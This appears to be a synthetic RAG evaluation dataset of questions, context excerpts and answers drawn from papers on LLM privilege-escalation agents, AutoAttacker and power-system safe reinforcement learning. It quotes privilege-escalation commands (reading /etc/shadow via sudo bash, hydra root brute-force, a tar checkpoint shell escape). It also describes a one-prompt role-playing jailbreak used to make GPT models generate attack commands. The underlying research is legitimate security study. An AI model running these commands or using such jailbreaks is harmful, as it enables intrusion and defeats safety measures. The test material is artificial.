How does the tool assess LLMs in Linux priv. escalation?,"['LLMs as Hackers: Autonomous Linux Privilege Escalation Attacks\nAndreas Happe\nandreas.happe@tuwien.ac.at\nTU Wien\nVienna, Austria\nAaron Kaplan\nDeep-Insight AI\nAustria\nJürgen Cito\njuergen.cito@tuwien.ac.at\nTU Wien\nVienna, Austria\nABSTRACT\nPenetration testing, an essential component of software security\ntesting, allows organizations to proactively identify and remediate\nvulnerabilities in their systems, thus bolstering their defense mech-\nanisms against potential cyberattacks. One recent advancement\nin the realm of penetration testing is the utilization of Language\nModels (LLMs). We explore the intersection of LLMs and penetra-\ntion testing to gain insight into their capabilities and challenges in\nthe context of privilege escalation. We create an automated Linux\nprivilege-escalation benchmark utilizing local virtual machines.\nWe introduce an LLM-guided privilege-escalation tool designed\nfor evaluating different LLMs and prompt strategies against our\nbenchmark. Our results show that GPT-4 is well suited for detecting\nfile-based exploits as it can typically solve 75-100% of test-cases\nof that vulnerability class. GPT-3.5-turbo was only able to solve\n25–50% of those, while local models, such as Llama2 were not able\nto detect any exploits. We analyze the impact of different prompt\ndesigns, the benefits of in-context learning, and the advantages of\noffering high-level guidance to LLMs. We discuss challenging areas\nfor LLMs, including maintaining focus during testing, coping with\nerrors, and finally comparing them with both stochastic parrots as\nwell as with human hackers.\n1\nINTRODUCTION\nIn the rapidly evolving field of cybersecurity, penetration testing\n(“pen-testing”) plays a pivotal role in identifying and mitigating\npotential vulnerabilities in a system. A crucial subtask of pen-testing\nis Linux privilege escalation, which involves exploiting a bug, design\nflaw, or configuration oversight in an operating system or software\napplication to gain elevated access to resources that are normally\nprotected from an application or user [36]. The ability to escalate\nprivileges can provide a malicious actor with increased access,\npotentially leading to more significant breaches or system damage.\nTherefore, understanding and improving the performance of tools\nused for this task is highly relevant. In this paper, we focus on\ninvestigating the performance of Large Language Models (LLMs) in\nthe context of penetration testing, specifically for Linux privilege\nescalation. LLMs have shown remarkable abilities in emulating\nhuman behavior that can be leveraged to automate and enhance\nvarious tasks in pen-testing [7, 16]. However, there is currently no\nunderstanding on how these models perform in common privilege\nescalation scenarios.\nTo address this gap, we developed a comprehensive benchmark\nfor Linux privilege escalation. This benchmark provides a standard-\nized platform to evaluate and compare the performance of different\nLLMs in a controlled manner. We perform an empirical analysis of\nvarious LLMs using this benchmark, providing insight into their\nstrengths and weaknesses in the context of privilege escalation.\nOur established benchmark will contribute to ongoing efforts to\nimprove the capabilities of LLMs in cybersecurity, particularly in\npenetration testing. By understanding the performance of these\nmodels in the critical task of privilege escalation, we can guide fu-\nture research and development efforts to improve their effectiveness\nand reliability.\nContributions. This work arose from the question “What is the\nefficacy of LLMs for Linux Privilege-Escalation Attacks”? To answer\nit, we initially analyzed existing Linux privilege-escalation attack\nvectors, integrated them into a fully automated benchmark, imple-\nmented an LLM-driven exploitation tool designed for rapid proto-\ntyping, and identified properties of LLM-based penetration testing\nthrough empirical analysis of performed benchmark runs. This\napproach results in the following contributions:\n• a novel Linux privilege escalation benchmark for rating\nthe suitability of LLMs for pen-testing (Section 3 Building\na Benchmark)\n• an fully-automated LLM-driven Linux privilege escalation\nprototype, wintermute (Section 4 Prototype)\n• a quantitative analysis of the feasibility of using LLMs for\nprivilege-escalation (Section 5 Evaluation)\nImplementation details such as individual prompt designs, ex-\nploit examples for the implemented vulnerabilities and the full list\nof high-level hints can be found in the supplementary material.\n1.1\nMethodology\nWe see our research within the domain of Design Science and well-\naligned with design science’s purpose of �']",The tool assesses LLMs in Linux privilege escalation by utilizing a comprehensive benchmark that provides a standardized platform to evaluate and compare the performance of different LLMs in a controlled manner. It includes an LLM-guided privilege-escalation tool designed for evaluating different LLMs and prompt strategies against the benchmark.,reasoning,"[{'Published': '2024-03-19', 'Title': 'LLMs as Hackers: Autonomous Linux Privilege Escalation Attacks', 'Authors': 'Andreas Happe, Aaron Kaplan, Jürgen Cito', 'Summary': 'Penetration testing, an essential component of software security testing,\nallows organizations to proactively identify and remediate vulnerabilities in\ntheir systems, thus bolstering their defense mechanisms against potential\ncyberattacks. One recent advancement in the realm of penetration testing is the\nutilization of Language Models (LLMs).\n  We explore the intersection of LLMs and penetration testing to gain insight\ninto their capabilities and challenges in the context of privilege escalation.\nWe create an automated Linux privilege-escalation benchmark utilizing local\nvirtual machines. We introduce an LLM-guided privilege-escalation tool designed\nfor evaluating different LLMs and prompt strategies against our benchmark.\n  Our results show that GPT-4 is well suited for detecting file-based exploits\nas it can typically solve 75-100\\% of test-cases of that vulnerability class.\nGPT-3.5-turbo was only able to solve 25-50% of those, while local models, such\nas Llama2 were not able to detect any exploits. We analyze the impact of\ndifferent prompt designs, the benefits of in-context learning, and the\nadvantages of offering high-level guidance to LLMs. We discuss challenging\nareas for LLMs, including maintaining focus during testing, coping with errors,\nand finally comparing them with both stochastic parrots as well as with human\nhackers.', 'entry_id': 'http://arxiv.org/abs/2310.11409v3', 'published_first_time': '2023-10-17', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2310.11409v3', 'http://arxiv.org/pdf/2310.11409v3']}]",True
"How do SRL frameworks tackle high renewable energy and power electronics in modern power systems, and how does active learning boost their effectiveness?","['ection and Control, vol. 43, no. 4, pp. 102–107 (in Chinese), 2015.\n[4] J. Shair, H. Li, J. Hu, and X. Xie, “Power system stability issues,\nclassifications and research prospects in the context of high-penetration\nof renewables and power electronics,” Renewable and Sustainable\nEnergy Reviews, vol. 145, p. 111111, July 2021.\n[5] R. S. Sutton and A. G. Barto, Reinforcement Learning: An Introduction.\nMIT press, 2018.\n[6] W. Liu, D. Zhang, X. Wang, J. Hou, and L. Liu, “A Decision Making\nStrategy for Generating Unit Tripping Under Emergency Circumstances\nBased on Deep Reinforcement Learning,” Proceedings of the CSEE,\nvol. 38, no. 01, pp. 109–119+347, 2018.\n[7] J. Zhang, Y. Luo, B. Wang, C. Lu, J. Si, and J. Song, “Deep\nReinforcement Learning for Load Shedding Against Short-Term Voltage\nInstability in Large Power Systems,” IEEE Transactions on Neural\nNetworks and Learning Systems, pp. 1–12, 2021.\n[8] R. R. Hossain, Q. Huang, and R. Huang, “Graph Convolutional Network-\nBased Topology Embedded Deep Reinforcement Learning for Voltage\nStability Control,” IEEE Transactions on Power Systems, vol. 36,\npp. 4848–4851, Sept. 2021.\n[9] X. Chen, G. Qu, Y. Tang, S. Low, and N. Li, “Reinforcement Learning\nfor Selective Key Applications in Power Systems: Recent Advances and\nFuture Challenges,” IEEE Transactions on Smart Grid, pp. 1–1, 2022.\n[10] G. Dulac-Arnold, N. Levine, D. J. Mankowitz, J. Li, C. Paduraru,\nS. Gowal, and T. Hester, “Challenges of real-world reinforcement\nlearning: Definitions, benchmarks and analysis,” Machine Learning,\nvol. 110, pp. 2419–2468, Sept. 2021.\n[11] Y. Shi, G. Qu, S. Low, A. Anandkumar, and A. Wierman, “Stability\nConstrained Reinforcement Learning for Real-Time Voltage Control,” in\n2022 American Control Conference (ACC), pp. 2715–2721, June 2022.\n[12] T. L. Vu, S. Mukherjee, T. Yin, R. Huang, J. Tan, and Q. Huang,\n“Safe Reinforcement Learning for Emergency Load Shedding of Power\nSystems,” in 2021 IEEE Power & Energy Society General Meeting\n(PESGM), pp. 1–5, July 2021.\n[13] L. Brunke, M. Greeff, A. W. Hall, Z. Yuan, S. Zhou, J. Panerati, and A. P.\nSchoellig, “Safe Learning in Robotics: From Learning-Based Control to\nSafe Reinforcement Learning,” Annual Review of Control, Robotics, and\nAutonomous Systems, vol. 5, no. 1, pp. 411–444, 2022.\n[14] J. Li, X. Wang, S. Chen, and D. Yan, “Research and Application of Safe\nReinforcement Learning in Power System,” in 2023 8th Asia Conference\non Power and Electrical Engineering, pp. 1977–1982, Apr. 2023.\n[15] W. Wang, N. Yu, Y. Gao, and J. Shi, “Safe Off-Policy Deep Reinforce-\nment Learning Algorithm for Volt-VAR Control in Power Distribution\nSystems,” IEEE Transactions on Smart Grid, vol. 11, pp. 3008–3018,\nJuly 2020.\n[16] Y. Gao and N. Yu, “Model-augmented safe reinforcement learning\nfor Volt-VAR control in power distribution networks,” Applied Energy,\nvol. 313, p. 118762, May 2022.\n[17] P. Ren, Y. Xiao, X. Chang, P.-Y. Huang, Z. Li, B. B. Gupta, X. Chen,\nand X. Wang, “A Survey of Deep Active Learning,” ACM Computing\nSurveys, vol. 54, pp. 180:1–180:40, Oct. 2021.\n[18] V. Malbas', '1\nMake Safe Decisions in Power System: Safe\nReinforcement Learning Based Pre-decision Making\nfor Voltage Stability Emergency Control\nCongbo Bi, Student Member, IEEE, Lipeng Zhu, Di Liu, Member, IEEE, and Chao Lu, Senior Member, IEEE\nAbstract—The high penetration of renewable energy and\npower electronic equipment bring significant challenges to the\nefficient construction of adaptive emergency control strate-\ngies against various presumed contingencies in today’s power\nsystems. Traditional model-based emergency control methods\nhave difficulty in adapt well to various complicated operating\nconditions in practice. Fr emerging artificial intelligence-based\napproaches, i.e., reinforcement learning-enabled solutions, they\nare yet to provide solid safety assurances under strict constraints\nin practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-\ndecision making framework against short-term voltage collapse.\nOur proposed framework employs neural networks for pre-\ndecision formulation, security margin estimation, and correc-\ntive action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a\nsecurity projecting correction algorithm that offers theoretical\nsecurity assurances to amend risky actions. The applicability of\nthe algorithm is further enhanced through the incorporation\nof active learning, which expedites the training process and\nimproves security estimation accuracy. Extensive numerical tests\non the New England 39-bus system and the realistic Guangdong\nProvincal Power Grid demonstrate the effectiveness of the\nproposed framework.\nIndex Terms—pre-decision making, safe reinforcement learn-\ning, security margin, power system, short-term stability\nI. INTRODUCTION\nW\nITH the increasing penetration of renewable energy\nsources and electronic equipment into modern power\nsystems, the operating conditions of the power systems are\nmore and more complex and variable, bringing unprecedented\nchallenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies [1].\nConventionally, the widely-used approach to emergency con-\ntrol in practical power systems is implemented in the form of\nformulating formulating a set of control strategies in advance,\nThis work was supported in part by the China Southern Power Grid\nResearch Project ZBKJXM20232029 and the National Natural Science Foun-\ndation of China under Grant 52207094.\nThis work has been submitted to the IEEE for possible publication.\nCopyright may be transferred without notice, after which this version may\nno longer be accessible.\nCongbo Bi is with the Department of Electrical Engineeering, Tsinghua\nUniversity, Beijing, 100084 China (e-mail: thueea bcb@outlook.com).\nLipeng Zhu is with the College of Electrical and Information Engineering,\nHunan University, Hunan, 410082 China (e-mail:zhulpwhu@126.com).\nDi Liu is with the Department of Electrical Engineeering, Tsinghua\nUniversity, Beijing, 100084 China (e-mail: kfliudi@163.com).\nChao Lu is with the Department of Electrical Engineeering, Tsinghua\nUniversity, Beijing, 100084 China (e-mail: luchao@tsinghua.edu.cn).\nand matching them with practical operational scenarios in real-\ntime. This procedure involves the construction of a ‘presumed\nfault set’, necessitating numerous time-consuming simulations\nto derive a suitable table of emergency control strategies [2].\nConsidering the complexity, it is a common practice to focus\non a small number of representative scenarios for strategy\nformulation. As the structural and operational complexity\nof power systems increases, the above-mentioned traditional\napproaches is confronted with challenges of how to effectively\nmanage the remendous presumed operational scenarios within\na limited period of time [3]. Moreover, the intricate dynamic\ncharacteristics of renewable energy sources and power elec-\ntronic devices make it quite difficult to accurately model\nsystem dynamics, thereby undermining the reliability of the\ntraditional approach to emergency control [4]. In this respect,\nit is imperative to swiftly identify high-risk operating statuses\nand formulate suitable emergency control measures.\nDifferent from traditional approaches severely relying on\ndetailed system modeling and simulations, deep reinforcement\nlearning (DRL) methods provide a promising data-driven\nalternative to solve these issues. Specifically, DRL agent can\nlearn from interactions with the environment of the system\nand update its policy without reliance on the knowledge about\ndetailed system models and parameters [5]. There have been\nextensive studies on the formulation of DRL-based emergency\ncontrol strategies [6]–[8], where emergency control is modeled\nas a Markov decision process (MDP) and a DRL agent learns\nopt']","SRL frameworks tackle high renewable energy and power electronics in modern power systems by developing a pre-decision making framework against short-term voltage collapse. This framework employs neural networks for pre-decision formulation, security margin estimation, and corrective action implementation without relying on precise system parameters. Active learning boosts their effectiveness by expediting the training process and improving security estimation accuracy.",multi_context,"[{'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}, {'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}]",True
What is the application of Deep Bayesian Active Learning in power system transient stability assessment?,"['a, C. Zheng, P.-C. Chen, T. Popovic, and M. Kezunovic,\n“Voltage Stability Prediction Using Active Machine Learning,” IEEE\nTransactions on Smart Grid, vol. 8, pp. 3117–3124, Nov. 2017.\n[19] Y. Zhang, Q. Zhao, B. Tan, and J. Yang, “A power system transient\nstability assessment method based on active learning,” The Journal of\nEngineering, vol. 2021, no. 11, pp. 715–723, 2021.\n[20] K. Wang, Z. Chen, W. Wei, X. Sun, S. Mei, Y. Xu, T. Zhu, and J. Liu,\n“Power System Transient Stability Assessment Based on Deep Bayesian\nActive Learning,” in 2022 IEEE/IAS Industrial and Commercial Power\nSystem Asia (I&CPS Asia), pp. 1692–1696, July 2022.\n[21] W. Zhao, T. He, R. Chen, T. Wei, and C. Liu, “State-wise Safe\nReinforcement Learning: A Survey,” May 2023.\n[22] Z. Shi, Y. Xu, X. Wu, J. He, R. Yang, and M. Yang, “Assessment of\nsystem protection strategy and aided decision scheme for AC/DC hybrid\npower systems,” Electric Power Automation Equipment, vol. 40, no. 4,\npp. 25–31 (in Chinese), 2020.\n[23] Y. Yu, Y. Liu, C. Qin, and T. Yang, “Theory and Method of Power\nSystem Integrated Security Region Irrelevant to Operation States: An\nIntroduction,” Engineering, vol. 6, pp. 754–777, July 2020.\n[24] R. M. Larik, M. W. Mustafa, and M. N. Aman, “A critical review of\nthe state-of-art schemes for under voltage load shedding,” International\nTransactions on Electrical Energy Systems, vol. 29, no. 5, p. e2828,\n2019.\n[25] C. Dwivedi, “Literature Survey on Short-Term Voltage Stability Effect,\nCause and Control,” in 2018 IEEE Green Technologies Conference\n(GreenTech), pp. 15–20, Apr. 2018.\n[26] Y. Chen, Y. Luo, and C. Lu, “Power System Transient Voltage Stability\nRegion Boundary Approximation and Stability Margin Estimation Based\non Residual Neural Network,” in 2023 IEEE Belgrade PowerTech, pp. 1–\n10, June 2023.\n[27] X. Zhang and D. J. Hill, “Load Stability Index for Short-term Voltage\nStability Assessment,” in 2019 IEEE Power & Energy Society General\nMeeting (PESGM), pp. 1–5, Aug. 2019.\n[28] Z. Wang, T. Schaul, M. Hessel, H. van Hasselt, M. Lanctot, and\nN. de Freitas, “Dueling Network Architectures for Deep Reinforcement\nLearning,” arXiv:1511.06581 [cs], Apr. 2016.\n[29] L. Zhang, Q. Zhang, L. Shen, B. Yuan, X. Wang, and D. Tao,\n“Evaluating Model-Free Reinforcement Learning toward Safety-Critical\nTasks,” Proceedings of the AAAI Conference on Artificial Intelligence,\nvol. 37, pp. 15313–15321, June 2023.\n[30] T. Haarnoja, A. Zhou, P. Abbeel, and S. Levine, “Soft Actor-Critic:\nOff-Policy Maximum Entropy Deep Reinforcement Learning with a\nStochastic Actor,” arXiv:1801.01290 [cs, stat], Aug. 2018.\n[31] T. Athay, R. Podmore, and S. Virmani, “A Practical Method for the\nDirect Analysis of Transient Stability,” IEEE Transactions on Power\nApparatus and Systems, vol. PAS-98, pp. 573–584, Mar. 1979.\n11\n[32] Y. Chow, O. Nachum, A. Faust, M. Ghavamzadeh, and E. A. Du´\ne˜\nnez-\nGuzm´\nan, “Lyapunov-based safe policy optimization for continuous\ncontrol,” in The 36th International Conference on Machine Learning\n(']","Deep Bayesian Active Learning is applied in power system transient stability assessment, as mentioned in the context.",simple,"[{'Published': '2024-05-26', 'Title': 'Make Safe Decisions in Power System: Safe Reinforcement Learning Based Pre-decision Making for Voltage Stability Emergency Control', 'Authors': 'Congbo Bi, Lipeng Zhu, Di Liu, Chao Lu', 'Summary': ""The high penetration of renewable energy and power electronic equipment bring\nsignificant challenges to the efficient construction of adaptive emergency\ncontrol strategies against various presumed contingencies in today's power\nsystems. Traditional model-based emergency control methods have difficulty in\nadapt well to various complicated operating conditions in practice. Fr emerging\nartificial intelligence-based approaches, i.e., reinforcement learning-enabled\nsolutions, they are yet to provide solid safety assurances under strict\nconstraints in practical power systems. To address these research gaps, this\npaper develops a safe reinforcement learning (SRL)-based pre-decision making\nframework against short-term voltage collapse. Our proposed framework employs\nneural networks for pre-decision formulation, security margin estimation, and\ncorrective action implementation, without reliance on precise system\nparameters. Leveraging the gradient projection, we propose a security\nprojecting correction algorithm that offers theoretical security assurances to\namend risky actions. The applicability of the algorithm is further enhanced\nthrough the incorporation of active learning, which expedites the training\nprocess and improves security estimation accuracy. Extensive numerical tests on\nthe New England 39-bus system and the realistic Guangdong Provincal Power Grid\ndemonstrate the effectiveness of the proposed framework."", 'entry_id': 'http://arxiv.org/abs/2405.16485v1', 'published_first_time': '2024-05-26', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'eess.SY', 'categories': ['eess.SY', 'cs.SY'], 'links': ['http://arxiv.org/abs/2405.16485v1', 'http://arxiv.org/pdf/2405.16485v1']}]",True
How did Llama2's suid binaries and cmd params impact its cmds?,"['” query.\nThe results of test-runs containing HackTricks are included in\nTable 2 with a “-ht” postfix. They are not performing better than\ncomparable runs with larger context-sizes when it comes to pure\nquantitative measurements. As will be shown in Sections 6.1 and 6.2,\nthe quality of the resulting Linux commands is improved by includ-\ning HackTricks but other problems prevent this to be seen in purely\nquantitative measurements.\n5.5\nUsing State to Aggregate History\nUsing state as either replacement or in addition to the truncated\nhistory improved results, especially with LLMs that produce high-\nquality summaries such as GPT-4. This should yield smaller con-\ntext sizes as the LLM compresses history into the state. During\nevaluation, one drawback arose: the update-state prompts took sig-\nnificantly longer than the next-cmd prompts even when the latter\nincluded the history. Using GPT-4, the update-state queries took\n24 times longer than the next-cmd queries. It still took 21.5 times\nlonger when next-cmd included both the history and the state. The\nsame problem is also reflected by the measured token counts. Thus\nwhile using a state yields better results, its token and run-time cost\nmight counter-balance the benefits.\n6\nDISCUSSION\nWhile the metrics in our benchmark provide a quantitative overview\nof the efficacy of wintermute, we also inspected the quality of the\ngenerated Linux privilege-escalation commands based on data col-\nlected during benchmarking to discuss notions of causality and\ncommon-sense in multi-step exploits, and a comparison to com-\nmands and strategies that would be normally issued by human\npen-testers in similar situations.\n6.1\nQuality of Generated Commands\nWhile the locally-run Llama2-based LLMs generated valid-looking\nshell commands, they were convoluted and their intention often not\ndecipherable. Llama2 struggled with providing correct parameters\nto commands thus yielding failed command invocations. Table 3\nshows examples of faulty comamnds. Llama2 being able to identify\npotential suid binaries but not being able to abuse them, might\nindicate that GTFObins were not within its training corpus.\nLlama2/GPT-3.5 tried to abuse common credentials (GPT-3.5\nsometimes excessively so) while GPT-4 had to be prodded into this\nLLMs as Hackers: Autonomous Linux Privilege Escalation Attacks\n(a) GPT-3.5-turbo-16k with maxium context size 16k.\n(b) GPT-4 with maximum context size 8k.\nFigure 4: Context Token Usage by different models. Colors indicate different test-cases and are identical in both graphs.\nTable 3: Examples of faulty commands generated by LLMs.\n#\nModel\nGenerated Command\nIssue\n1\nLlama2\ngrep -v ’[[:alpha:]].*sh$’ /etc/passwd | cut -d’:’ -f7\nWhy would you grep for scripts?\n2\nLlama2\nsudo -u root /usr/bin/bash -c ’cat /etc/passwd,shadow’\nWhy not directly go for sudo bash?\n3\nLlama2\ncrontab -u lowriv <path_to_malicious_script\npath_to_malicious_script does not exist\nuser name is lowpriv not lowriv\n4\nLlama2\ndocker exec -it lowpriv_container_name /bin/bash\nlowpriv_container_name does not exist\n5\nGPT-3.5\nhydra -l root -P rockyou.txt ssh://localhost\nhydra and rockyou.txt do not exist\n6\nGPT-3.5\nsudo tar -cf /dev/null ...\nmissing file argument for tar\n–checkpoint=1 –checkpoint-action=exec=/bin/bash\ndirection through hints. While exploiting known vulnerabilities\nwas not explicitly asked for, all LLMs tried to exploit CVE-2019-\n14287 [20], GPT-4 tried to exploit CVE-2014-6271 (“shellshock”).\nBoth exploits were years old and “outdated” during the benchmark\ntime-frame.\nWhile In-Context Learning did not improve the quantitative\nresults, the quality and breadth of the generated exploitation com-\nmands was improved. Especially GPT-4 was able to partially exploit\ncron-wildcard vulnerabilities for the first time, but eventually failed\ndue to the multi-step nature']","Llama2 was able to identify potential suid binaries but struggled with providing correct parameters to commands, resulting in failed command invocations.",reasoning,"[{'Published': '2024-03-19', 'Title': 'LLMs as Hackers: Autonomous Linux Privilege Escalation Attacks', 'Authors': 'Andreas Happe, Aaron Kaplan, Jürgen Cito', 'Summary': 'Penetration testing, an essential component of software security testing,\nallows organizations to proactively identify and remediate vulnerabilities in\ntheir systems, thus bolstering their defense mechanisms against potential\ncyberattacks. One recent advancement in the realm of penetration testing is the\nutilization of Language Models (LLMs).\n  We explore the intersection of LLMs and penetration testing to gain insight\ninto their capabilities and challenges in the context of privilege escalation.\nWe create an automated Linux privilege-escalation benchmark utilizing local\nvirtual machines. We introduce an LLM-guided privilege-escalation tool designed\nfor evaluating different LLMs and prompt strategies against our benchmark.\n  Our results show that GPT-4 is well suited for detecting file-based exploits\nas it can typically solve 75-100\\% of test-cases of that vulnerability class.\nGPT-3.5-turbo was only able to solve 25-50% of those, while local models, such\nas Llama2 were not able to detect any exploits. We analyze the impact of\ndifferent prompt designs, the benefits of in-context learning, and the\nadvantages of offering high-level guidance to LLMs. We discuss challenging\nareas for LLMs, including maintaining focus during testing, coping with errors,\nand finally comparing them with both stochastic parrots as well as with human\nhackers.', 'entry_id': 'http://arxiv.org/abs/2310.11409v3', 'published_first_time': '2023-10-17', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2310.11409v3', 'http://arxiv.org/pdf/2310.11409v3']}]",True
What does jailbreaking in LLMs involve and why is it necessary for generating malicious commands?,"["", which are reviewed below.\nJailbreaking in LLMs refers to circumventing built-in secu-\nrity measures to elicit responses to queries that are typically\nrestricted or deemed unsafe, effectively unlocking features that\nare normally constrained by safety mechanisms [72]. Based\non our preliminary analysis (see details in Section III-A),\nasking commercial LLM products like ChatGPT to generate\nmalicious commands is forbidden, so we need to jailbreak\nLLMs before launching actual attacks. Various techniques\nhave been proposed for successfully bypassing the safeguards\nin LLMs [73], [74] by a few queries [75] or automatically\ngenerated prompts [76]. Wei et al. [77] highlighted how the\nalignment tendencies of LLMs can be altered using in-context\ndemonstrations, and new tactics are quickly discovered by\nother studies [72], [78].\nYet, we found the existing jailbreaking methods are not\nalways suitable for our setting, where the attacker environment\n(e.g., a compromised workstation in an enterprise) is more\nconstrained. Jailbreaking methods based on multiple queries\nwith a low success rate can slow down the attacks and even\nexpose the attackers. For example, PAIR [75] can only reach\n62% and 60% success rates with 16.6 and 15.6 queries in GPT-\n4 and GPT-3.5. In this work, we propose a highly efficient\njailbreaking method on top of “role-playing”, which succeeds\nwith just one prompt. More details are shown in Section IV-A.\nIn the meantime, several works demonstrate the possibility\nof defending against jailbreaking attacks, using adversarial\ntraining [79] or output checking [80], which can be potentially\neffective against our method.\nIII. MOTIVATION\nIn this section, we describe our exploratory study that\nleverages LLMs in a standard fashion for cyber-attacks, the\nchallenges of using LLMs for penetration testing, and issues\nwith prior related works. We also provide an example to\nmotivate the usage of LLMs for attack automation in Ap-\npendix VIII.\nA. Limitations of LLMs\nThough prior works from the machine learning community\nshow that LLMs can perform well in text summarization, tool-\nusing, and code generation in normal settings, as reviewed\nin Section II-B, we found the results to be unsatisfactory\nwhen directly “plugging in” LLMs or following prior research\nworks. In fact, human guidance/correction is needed to achieve\nthe desired outcome, so the attack is not fully automated. This\nconclusion comes from our preliminary experiments using\nOpenAI GPT-3.5 and GPT-4.\nThe first problem we encounter is that the GPT models\nrefuse to respond to our prompts related to penetration testing\ndirectly, as shown below.\n# User:\nHow to get the system privilege by\nMetasploit?\n,\n→\n# GPT-4:\nI'm sorry, I cannot assist with that\nrequest.\n,\n→\n...\nAssuming we are able to bypass the constraints (details\nare shown in Section IV-A), when we ask the GPT models\nto generate a runnable attack command to obtain system\nprivilege, the response is too verbose and hard to parse. Below\nis an example (the jailbreaking text is omitted) and the full\nexample is shown in Appendix XI.\n# User:\nYou already got the meterpreter reverse\nshell of the victim Windows 10. Give\nthe exact command to get the system\naccount.\n,\n→\n,\n→\n,\n→\n# GPT-4:\n...\nHere's how you can use it:\n...\n2. **Execute the `getsystem` Command**:\n```\ngetsystem\n```\n...\nThe GPT models might forget about their execution environ-\nment (e.g., Metasploit, Windows, or Linux) in the middle\nof the attack task and generate the wrong commands. As\nan example below, assuming the attacker runs a Metasploit\nMeterpreter shell [81] on the victim’s machine and intends to\nuse the Metasploit attack payload, GPT-4 outputs a Windows\ncommand echo... that is simply not runnable. “Observa-\ntion” is the output from the previous command execution.\n“Thinking” is displayed when we request GPT-4 to conduct\nstep-by-step reasoning and “Command” is the exact command\nto execute.\n# GPT-4 plants the file by wrong\ncommands in the meterpreter shell\n,\n→\n""]","Jailbreaking in LLMs involves circumventing built-in security measures to elicit responses to queries that are typically restricted or deemed unsafe, effectively unlocking features that are normally constrained by safety mechanisms. It is necessary for generating malicious commands because commercial LLM products like ChatGPT forbid generating such commands, so jailbreaking is required to bypass these safeguards before launching actual attacks.",simple,"[{'Published': '2024-03-02', 'Title': 'AutoAttacker: A Large Language Model Guided System to Implement Automatic Cyber-attacks', 'Authors': 'Jiacen Xu, Jack W. Stokes, Geoff McDonald, Xuesong Bai, David Marshall, Siyue Wang, Adith Swaminathan, Zhou Li', 'Summary': 'Large language models (LLMs) have demonstrated impressive results on natural\nlanguage tasks, and security researchers are beginning to employ them in both\noffensive and defensive systems. In cyber-security, there have been multiple\nresearch efforts that utilize LLMs focusing on the pre-breach stage of attacks\nlike phishing and malware generation. However, so far there lacks a\ncomprehensive study regarding whether LLM-based systems can be leveraged to\nsimulate the post-breach stage of attacks that are typically human-operated, or\n""hands-on-keyboard"" attacks, under various attack techniques and environments.\n  As LLMs inevitably advance, they may be able to automate both the pre- and\npost-breach attack stages. This shift may transform organizational attacks from\nrare, expert-led events to frequent, automated operations requiring no\nexpertise and executed at automation speed and scale. This risks fundamentally\nchanging global computer security and correspondingly causing substantial\neconomic impacts, and a goal of this work is to better understand these risks\nnow so we can better prepare for these inevitable ever-more-capable LLMs on the\nhorizon. On the immediate impact side, this research serves three purposes.\nFirst, an automated LLM-based, post-breach exploitation framework can help\nanalysts quickly test and continually improve their organization\'s network\nsecurity posture against previously unseen attacks. Second, an LLM-based\npenetration test system can extend the effectiveness of red teams with a\nlimited number of human analysts. Finally, this research can help defensive\nsystems and teams learn to detect novel attack behaviors preemptively before\ntheir use in the wild....', 'entry_id': 'http://arxiv.org/abs/2403.01038v1', 'published_first_time': '2024-03-02', 'comment': None, 'journal_ref': None, 'doi': 